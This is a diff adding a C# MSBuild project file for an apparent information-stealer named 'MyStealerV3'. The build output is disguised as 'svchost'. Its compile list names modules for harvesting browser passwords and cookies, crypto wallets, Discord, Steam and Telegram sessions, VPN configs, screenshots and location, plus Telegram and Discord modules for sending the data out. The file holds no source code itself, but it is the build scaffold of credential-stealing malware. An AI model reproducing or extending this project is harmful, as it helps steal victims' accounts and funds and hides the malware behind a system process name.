@@ -1,0 +1,245 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Import Project="$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props" Condition="Exists('$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props')" />
+  <PropertyGroup>
+    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
+    <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
+    <ProjectGuid>{F8EC7E6B-9493-4D8D-ACC8-B6EAAE86EBF6}</ProjectGuid>
+    <OutputType>WinExe</OutputType>
+    <RootNamespace>MyStealerV3</RootNamespace>
+    <AssemblyName>svchost</AssemblyName>
+    <TargetFrameworkVersion>v4.8</TargetFrameworkVersion>
+    <FileAlignment>512</FileAlignment>
+    <AutoGenerateBindingRedirects>true</AutoGenerateBindingRedirects>
+    <Deterministic>true</Deterministic>
+    <PublishUrl>publish\</PublishUrl>
+    <Install>true</Install>
+    <InstallFrom>Disk</InstallFrom>
+    <UpdateEnabled>false</UpdateEnabled>
+    <UpdateMode>Foreground</UpdateMode>
+    <UpdateInterval>7</UpdateInterval>
+    <UpdateIntervalUnits>Days</UpdateIntervalUnits>
+    <UpdatePeriodically>false</UpdatePeriodically>
+    <UpdateRequired>false</UpdateRequired>
+    <MapFileExtensions>true</MapFileExtensions>
+    <ApplicationRevision>0</ApplicationRevision>
+    <ApplicationVersion>1.0.0.%2a</ApplicationVersion>
+    <IsWebBootstrapper>false</IsWebBootstrapper>
+    <UseApplicationTrust>false</UseApplicationTrust>
+    <BootstrapperEnabled>true</BootstrapperEnabled>
+    <NuGetPackageImportStamp>
+    </NuGetPackageImportStamp>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <Optimize>false</Optimize>
+    <OutputPath>bin\Debug\</OutputPath>
+    <DefineConstants>DEBUG;TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugType>none</DebugType>
+    <Optimize>true</Optimize>
+    <OutputPath>build\Source\</OutputPath>
+    <DefineConstants>TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+    <GenerateSerializationAssemblies>Off</GenerateSerializationAssemblies>
+  </PropertyGroup>
+  <PropertyGroup>
+    <StartupObject>MyStealerV3.Program</StartupObject>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)' == 'Debug|x64'">
+    <PlatformTarget>x64</PlatformTarget>
+    <OutputPath>bin\x64\Debug\</OutputPath>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)' == 'Release|x64'">
+    <PlatformTarget>x64</PlatformTarget>
+    <OutputPath>bin\x64\Release\</OutputPath>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)' == 'Test|AnyCPU'">
+    <OutputPath>bin\Test\</OutputPath>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)' == 'Test|x64'">
+    <OutputPath>build\release\</OutputPath>
+    <DefineConstants>TRACE</DefineConstants>
+    <Optimize>true</Optimize>
+    <ErrorReport>prompt</ErrorReport>
+    <DebugType>pdbonly</DebugType>
+    <DebugSymbols>true</DebugSymbols>
+  </PropertyGroup>
+  <PropertyGroup>
+    <ApplicationIcon>
+    </ApplicationIcon>
+  </PropertyGroup>
+  <PropertyGroup>
+    <NoWin32Manifest>true</NoWin32Manifest>
+  </PropertyGroup>
+  <ItemGroup>
+    <Reference Include="DotNetZip, Version=1.16.0.0, Culture=neutral, PublicKeyToken=6583c7c814667745, processorArchitecture=MSIL">
+      <HintPath>packages\DotNetZip.1.16.0\lib\net40\DotNetZip.dll</HintPath>
+    </Reference>
+    <Reference Include="Newtonsoft.Json, Version=13.0.0.0, Culture=neutral, PublicKeyToken=30ad4fe6b2a6aeed, processorArchitecture=MSIL">
+      <HintPath>packages\Newtonsoft.Json.13.0.1\lib\net45\Newtonsoft.Json.dll</HintPath>
+    </Reference>
+    <Reference Include="System" />
+    <Reference Include="System.Buffers, Version=4.0.3.0, Culture=neutral, PublicKeyToken=cc7b13ffcd2ddd51, processorArchitecture=MSIL">
+      <HintPath>packages\System.Buffers.4.5.1\lib\net461\System.Buffers.dll</HintPath>
+    </Reference>
+    <Reference Include="System.CodeDom, Version=6.0.0.0, Culture=neutral, PublicKeyToken=cc7b13ffcd2ddd51, processorArchitecture=MSIL">
+      <HintPath>packages\System.CodeDom.6.0.0\lib\net461\System.CodeDom.dll</HintPath>
+    </Reference>
+    <Reference Include="System.ComponentModel.Annotations, Version=4.2.1.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>packages\System.ComponentModel.Annotations.5.0.0\lib\net461\System.ComponentModel.Annotations.dll</HintPath>
+    </Reference>
+    <Reference Include="System.ComponentModel.DataAnnotations" />
+    <Reference Include="System.Core" />
+    <Reference Include="System.Drawing" />
+    <Reference Include="System.Management" />
+    <Reference Include="System.Memory, Version=4.0.1.1, Culture=neutral, PublicKeyToken=cc7b13ffcd2ddd51, processorArchitecture=MSIL">
+      <HintPath>packages\System.Memory.4.5.4\lib\net461\System.Memory.dll</HintPath>
+    </Reference>
+    <Reference Include="System.Numerics" />
+    <Reference Include="System.Numerics.Vectors, Version=4.1.4.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>packages\System.Numerics.Vectors.4.5.0\lib\net46\System.Numerics.Vectors.dll</HintPath>
+    </Reference>
+    <Reference Include="System.Runtime.CompilerServices.Unsafe, Version=6.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
+      <HintPath>packages\System.Runtime.CompilerServices.Unsafe.6.0.0\lib\net461\System.Runtime.CompilerServices.Unsafe.dll</HintPath>
+    </Reference>
+    <Reference Include="System.Security" />
+    <Reference Include="System.Threading.Tasks.Extensions, Version=4.2.0.1, Culture=neutral, PublicKeyToken=cc7b13ffcd2ddd51, processorArchitecture=MSIL">
+      <HintPath>packages\System.Threading.Tasks.Extensions.4.5.4\lib\net461\System.Threading.Tasks.Extensions.dll</HintPath>
+    </Reference>
+    <Reference Include="System.Xml.Linq" />
+    <Reference Include="System.Data.DataSetExtensions" />
+    <Reference Include="Microsoft.CSharp" />
+    <Reference Include="System.Data" />
+    <Reference Include="System.Net.Http" />
+    <Reference Include="System.Xml" />
+    <Reference Include="Telegram.Bot, Version=18.0.0.0, Culture=neutral, processorArchitecture=MSIL">
+      <HintPath>packages\Telegram.Bot.18.0.0\lib\netstandard2.0\Telegram.Bot.dll</HintPath>
+    </Reference>
+  </ItemGroup>
+  <ItemGroup>
+    <Compile Include="Config.cs" />
+    <Compile Include="Resource\Help\BrowsersHelp\BrowserInList.cs" />
+    <Compile Include="Resource\Help\BrowsersHelp\Crypto\cAesGcm.cs" />
+    <Compile Include="Resource\Help\BrowsersHelp\Crypto\cBCrypt.cs" />
+    <Compile Include="Resource\Help\BrowsersHelp\Crypto\CryptoMain.cs" />
+    <Compile Include="Resource\Help\BrowsersHelp\Crypto\Cryptors.cs" />
+    <Compile Include="Resource\Help\BrowsersHelp\DataGet\AutoFill.cs" />
+    <Compile Include="Resource\Help\BrowsersHelp\DataGet\Bookmarks.cs" />
+    <Compile Include="Resource\Help\BrowsersHelp\DataGet\Cookies.cs" />
+    <Compile Include="Resource\Help\BrowsersHelp\DataGet\History.cs" />
+    <Compile Include="Resource\Help\BrowsersHelp\DataGet\Mozilla\Passwords.cs" />
+    <Compile Include="Resource\Help\BrowsersHelp\DataGet\Passwords.cs" />
+    <Compile Include="Resource\Help\BrowsersHelp\FireFoxHelpers\Passwords.cs" />
+    <Compile Include="Resource\Help\BrowsersHelp\FireFoxHelpers\Profile.cs" />
+    <Compile Include="Resource\Help\BrowsersHelp\offsets.cs" />
+    <Compile Include="Resource\Help\BrowsersHelp\Paths.cs" />
+    <Compile Include="Resource\Help\BrowsersHelp\SQL\SQLite.cs" />
+    <Compile Include="Resource\Help\BrowsersHelp\SQL\SqlReader.cs" />
+    <Compile Include="Resource\Help\BrowsersHelp\URLChecker.cs" />
+    <Compile Include="Resource\Help\Filemanager.cs" />
+    <Compile Include="Resource\Help\GenMessage.cs" />
+    <Compile Include="Program.cs" />
+    <Compile Include="Properties\AssemblyInfo.cs" />
+    <Compile Include="Resource\Help\Counter.cs" />
+    <Compile Include="Resource\Help\CreateZip.cs" />
+    <Compile Include="Resource\Help\Help.cs" />
+    <Compile Include="Resource\Help\Json.cs" />
+    <Compile Include="Resource\Help\sender.cs" />
+    <Compile Include="Resource\Help\StartThreads.cs" />
+    <Compile Include="Resource\ShareMethods\Discord\FormUpload.cs" />
+    <Compile Include="Resource\ShareMethods\Discord\MainDiscord.cs" />
+    <Compile Include="Resource\ShareMethods\Telegram\MainTelegram.cs" />
+    <Compile Include="Resource\ShareMethods\Telegram\offsets.cs" />
+    <Compile Include="Resource\Targets\Browsers\BrowserStart.cs" />
+    <Compile Include="Resource\Targets\Browsers\Data\Another.cs" />
+    <Compile Include="Resource\Targets\Browsers\Data\Edge.cs" />
+    <Compile Include="Resource\Targets\Browsers\Data\FireFox.cs" />
+    <Compile Include="Resource\Targets\Browsers\Data\Opera.cs" />
+    <Compile Include="Resource\Targets\Cryptocurrency\ArmoryWallet.cs" />
+    <Compile Include="Resource\Targets\Cryptocurrency\AtomicWallet.cs" />
+    <Compile Include="Resource\Targets\Cryptocurrency\CryptoMain.cs" />
+    <Compile Include="Resource\Targets\Cryptocurrency\ElectrumWallet.cs" />
+    <Compile Include="Resource\Targets\Cryptocurrency\ExodusWallet.cs" />
+    <Compile Include="Resource\Targets\Cryptocurrency\JaxxWallet.cs" />
+    <Compile Include="Resource\Targets\FileGraber\MainFileGraber.cs" />
+    <Compile Include="Resource\Targets\Others\Ethernet.cs" />
+    <Compile Include="Resource\Targets\Others\IpInfo.cs" />
+    <Compile Include="Resource\Targets\Others\Position\PositionMain.cs" />
+    <Compile Include="Resource\Targets\Others\ProcessList.cs" />
+    <Compile Include="Resource\Targets\Others\Screen\Screen.cs" />
+    <Compile Include="Resource\Targets\Others\SystemInfo\BSSID.cs" />
+    <Compile Include="Resource\Targets\Others\SystemInfo\GetMain.cs" />
+    <Compile Include="Resource\Targets\Others\SystemInfo\GetSystemHelper.cs" />
+    <Compile Include="Resource\Targets\Software\Discord\DiscordDesktop.cs" />
+    <Compile Include="Resource\Targets\Software\Steam\Steam.cs" />
+    <Compile Include="Resource\Targets\Software\Steam\SteamLocation.cs" />
+    <Compile Include="Resource\Targets\Software\Steam\SteamProfiles.cs" />
+    <Compile Include="Resource\Targets\Software\Telegram\TelegramDesktop.cs" />
+    <Compile Include="Resource\Targets\Software\VPN\NordVPN.cs" />
+    <Compile Include="Resource\Targets\Software\VPN\OpenVPN.cs" />
+    <Compile Include="Resource\Targets\Software\VPN\ProtonVPN.cs" />
+    <Compile Include="Resource\Targets\Software\VPN\VpnStart.cs" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="App.config" />
+    <None Include="packages.config" />
+  </ItemGroup>
+  <ItemGroup>
+    <BootstrapperPackage Include="Microsoft.Net.Framework.3.5.SP1">
+      <Visible>False</Visible>
+      <ProductName>.NET Framework 3.5 SP1</ProductName>
+      <Install>false</Install>
+    </BootstrapperPackage>
+  </ItemGroup>
+  <ItemGroup>
+    <COMReference Include="EnvDTE">
+      <Guid>{80CC9F66-E7D8-4DDD-85B6-D9E6CD0E93E2}</Guid>
+      <VersionMajor>8</VersionMajor>
+      <VersionMinor>0</VersionMinor>
+      <Lcid>0</Lcid>
+      <WrapperTool>tlbimp</WrapperTool>
+      <Isolated>False</Isolated>
+      <EmbedInteropTypes>True</EmbedInteropTypes>
+    </COMReference>
+    <COMReference Include="IWshRuntimeLibrary">
+      <Guid>{F935DC20-1CF0-11D0-ADB9-00C04FD58A0B}</Guid>
+      <VersionMajor>1</VersionMajor>
+      <VersionMinor>0</VersionMinor>
+      <Lcid>0</Lcid>
+      <WrapperTool>tlbimp</WrapperTool>
+      <Isolated>False</Isolated>
+      <EmbedInteropTypes>True</EmbedInteropTypes>
+    </COMReference>
+    <COMReference Include="stdole">
+      <Guid>{00020430-0000-0000-C000-000000000046}</Guid>
+      <VersionMajor>2</VersionMajor>
+      <VersionMinor>0</VersionMinor>
+      <Lcid>0</Lcid>
+      <WrapperTool>primary</WrapperTool>
+      <Isolated>False</Isolated>
+      <EmbedInteropTypes>True</EmbedInteropTypes>
+    </COMReference>
+    <COMReference Include="VSLangProj">
+      <Guid>{49A1950E-3E35-4595-8CB9-920C64C44D67}</Guid>
+      <VersionMajor>7</VersionMajor>
+      <VersionMinor>0</VersionMinor>
+      <Lcid>0</Lcid>
+      <WrapperTool>tlbimp</WrapperTool>
+      <Isolated>False</Isolated>
+      <EmbedInteropTypes>True</EmbedInteropTypes>
+    </COMReference>
+  </ItemGroup>
+  <ItemGroup>
+    <Content Include="Izobrazhenie-14-5.ico" />
+  </ItemGroup>
+  <ItemGroup />
+  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
+</Project>
